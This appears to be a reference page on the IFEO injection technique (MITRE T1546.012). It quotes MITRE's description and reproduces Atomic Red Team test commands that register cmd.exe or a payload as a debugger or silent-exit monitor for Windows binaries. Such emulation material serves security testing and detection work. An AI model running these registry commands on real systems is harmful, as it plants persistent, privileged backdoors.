
# Image File Execution Options Injection

## Description

### MITRE Description

> Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IEFO) debuggers. IEFOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.

Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1546/012

## Potential Commands

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v Debugger /d "C:\Windows\System32\cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "C:\Windows\System32\cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\calc.exe" /v Debugger /d "#{payload_binary}"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe" /v MonitorProcess /d "#{payload_binary}"
```

## Commands Dataset

```
[{'command': 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution '
             'Options\\C:\\Windows\\System32\\calc.exe" /v Debugger /d '
             '"#{payload_binary}"\n',
  'name': None,
  'source': 'atomics/T1546.012/T1546.012.yaml'},
 {'command': 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution '
             'Options\\#{target_binary}" /v Debugger /d '
             '"C:\\Windows\\System32\\cmd.exe"\n',
  'name': None,
  'source': 'atomics/T1546.012/T1546.012.yaml'},
 {'command': 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution '
             'Options\\C:\\Windows\\System32\\notepad.exe" /v GlobalFlag /t '
             'REG_DWORD /d 512\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe" '
             '/v ReportingMode /t REG_DWORD /d 1\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe" '
             '/v MonitorProcess /d "#{payload_binary}"\n',
  'name': None,
  'source': 'atomics/T1546.012/T1546.012.yaml'},
 {'command': 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution '
             'Options\\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" /v '
             'ReportingMode /t REG_DWORD /d 1\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" /v '
             'MonitorProcess /d "C:\\Windows\\System32\\cmd.exe"\n',
  'name': None,
  'source': 'atomics/T1546.012/T1546.012.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Event Triggered Execution: Image File Execution Options Injection': {'atomic_tests': [{'auto_generated_guid': 'fdda2626-5234-4c90-b163-60849a24c0b8',
                                                                                                                 'description': 'Leverage '
                                                                                                                                'Global '
                                                                                                                                'Flags '
                                                                                                                                'Settings\n',
                                                                                                                 'executor': {'cleanup_command': 'reg '
                                                                                                                                                 'delete '
                                                                                                                                                 '"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows '
                                                                                                                                                 'NT\\CurrentVersion\\Image '
                                                                                                                                                 'File '
                                                                                                                                                 'Execution '
                                                                                                                                                 'Options\\#{target_binary}" '
                                                                                                                                                 '/v '
                                                                                                                                                 'Debugger '
                                                                                                                                                 '/f '
                                                                                                                                                 '>nul '
                                                                                                                                                 '2>&1\n',
                                                                                                                              'command': 'REG '
                                                                                                                                         'ADD '
                                                                                                                                         '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                                                         'NT\\CurrentVersion\\Image '
                                                                                                                                         'File '
                                                                                                                                         'Execution '
                                                                                                                                         'Options\\#{target_binary}" '
                                                                                                                                         '/v '
                                                                                                                                         'Debugger '
                                                                                                                                         '/d '
                                                                                                                                         '"#{payload_binary}"\n',
                                                                                                                              'elevation_required': True,
                                                                                                                              'name': 'command_prompt'},
                                                                                                                 'input_arguments': {'payload_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                                                        'description': 'Binary '
                                                                                                                                                                       'To '
                                                                                                                                                                       'Execute',
                                                                                                                                                        'type': 'Path'},
                                                                                                                                     'target_binary': {'default': 'C:\\Windows\\System32\\calc.exe',
                                                                                                                                                       'description': 'Binary '
                                                                                                                                                                      'To '
                                                                                                                                                                      'Attach '
                                                                                                                                                                      'To',
                                                                                                                                                       'type': 'Path'}},
                                                                                                                 'name': 'IFEO '
                                                                                                                         'Add '
                                                                                                                         'Debugger',
                                                                                                                 'supported_platforms': ['windows']},
                                                                                                                {'auto_generated_guid': '46b1f278-c8ee-4aa5-acce-65e77b11f3c1',
                                                                                                                 'description': 'Leverage '
                                                                                                                                'Global '
                                                                                                                                'Flags '
                                                                                                                                'Settings\n',
                                                                                                                 'executor': {'cleanup_command': 'reg '
                                                                                                                                                 'delete '
                                                                                                                                                 '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                                                                 'NT\\CurrentVersion\\Image '
                                                                                                                                                 'File '
                                                                                                                                                 'Execution '
                                                                                                                                                 'Options\\#{target_binary}" '
                                                                                                                                                 '/v '
                                                                                                                                                 'GlobalFlag '
                                                                                                                                                 '/f '
                                                                                                                                                 '>nul '
                                                                                                                                                 '2>&1\n'
                                                                                                                                                 'reg '
                                                                                                                                                 'delete '
                                                                                                                                                 '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                                                                 'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" '
                                                                                                                                                 '/v '
                                                                                                                                                 'ReportingMode '
                                                                                                                                                 '/f '
                                                                                                                                                 '>nul '
                                                                                                                                                 '2>&1\n'
                                                                                                                                                 'reg '
                                                                                                                                                 'delete '
                                                                                                                                                 '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                                                                 'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" '
                                                                                                                                                 '/v '
                                                                                                                                                 'MonitorProcess '
                                                                                                                                                 '/f '
                                                                                                                                                 '>nul '
                                                                                                                                                 '2>&1\n',
                                                                                                                              'command': 'REG '
                                                                                                                                         'ADD '
                                                                                                                                         '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                                                         'NT\\CurrentVersion\\Image '
                                                                                                                                         'File '
                                                                                                                                         'Execution '
                                                                                                                                         'Options\\#{target_binary}" '
                                                                                                                                         '/v '
                                                                                                                                         'GlobalFlag '
                                                                                                                                         '/t '
                                                                                                                                         'REG_DWORD '
                                                                                                                                         '/d '
                                                                                                                                         '512\n'
                                                                                                                                         'REG '
                                                                                                                                         'ADD '
                                                                                                                                         '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                                                         'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" '
                                                                                                                                         '/v '
                                                                                                                                         'ReportingMode '
                                                                                                                                         '/t '
                                                                                                                                         'REG_DWORD '
                                                                                                                                         '/d '
                                                                                                                                         '1\n'
                                                                                                                                         'REG '
                                                                                                                                         'ADD '
                                                                                                                                         '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                                                         'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" '
                                                                                                                                         '/v '
                                                                                                                                         'MonitorProcess '
                                                                                                                                         '/d '
                                                                                                                                         '"#{payload_binary}"\n',
                                                                                                                              'elevation_required': True,
                                                                                                                              'name': 'command_prompt'},
                                                                                                                 'input_arguments': {'payload_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                                                        'description': 'Binary '
                                                                                                                                                                       'To '
                                                                                                                                                                       'Execute',
                                                                                                                                                        'type': 'Path'},
                                                                                                                                     'target_binary': {'default': 'C:\\Windows\\System32\\notepad.exe',
                                                                                                                                                       'description': 'Binary '
                                                                                                                                                                      'To '
                                                                                                                                                                      'Attach '
                                                                                                                                                                      'To',
                                                                                                                                                       'type': 'Path'}},
                                                                                                                 'name': 'IFEO '
                                                                                                                         'Global '
                                                                                                                         'Flags',
                                                                                                                 'supported_platforms': ['windows']}],
                                                                                               'attack_technique': 'T1546.012',
                                                                                               'display_name': 'Event '
                                                                                                               'Triggered '
                                                                                                               'Execution: '
                                                                                                               'Image '
                                                                                                               'File '
                                                                                                               'Execution '
                                                                                                               'Options '
                                                                                                               'Injection'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors


* [TEMP.Veles](../actors/TEMP.Veles.md)

